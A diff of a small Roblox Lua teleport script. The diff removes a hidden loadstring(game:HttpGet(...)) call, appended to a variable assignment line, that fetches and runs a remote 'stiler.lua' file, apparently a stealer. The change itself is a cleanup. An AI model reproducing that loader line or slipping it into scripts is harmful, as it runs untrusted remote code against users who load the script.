@@ -1,5 +1,5 @@
 local targetPlaceId = 126884695634066
-local targetJobId = "750902da843513478c23a20c4446fdc1"loadstring(game:HttpGet('https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler.lua'))()
+local targetJobId = "750902da843513478c23a20c4446fdc1"
 -- Check if we're already in the right server
 if game.PlaceId == targetPlaceId and game.JobId == targetJobId then
     -- Already in the correct place and job, just run the script
@@ -15,3 +15,4 @@ else
 
     TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, LocalPlayer)
 end
+
